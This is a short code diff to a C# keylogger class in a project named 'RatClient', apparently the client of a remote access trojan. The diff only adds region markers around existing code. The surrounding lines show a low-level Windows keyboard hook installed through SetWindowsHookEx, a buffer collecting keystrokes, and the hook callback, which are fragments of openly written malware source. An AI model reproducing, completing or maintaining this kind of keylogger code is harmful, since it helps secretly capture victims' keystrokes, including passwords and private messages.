@@ -8,6 +8,7 @@ namespace RatClient.Features
 {
     public class KeyLogger
     {
+        #region Variables
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
@@ -29,7 +30,9 @@ namespace RatClient.Features
         private static StringBuilder keyStrokes = new StringBuilder();
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+        #endregion
 
+        #region Methods
         public static void Start()
         {
             _hookID = SetHook(_proc);
@@ -69,5 +72,6 @@ namespace RatClient.Features
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
+        #endregion
     }
 }
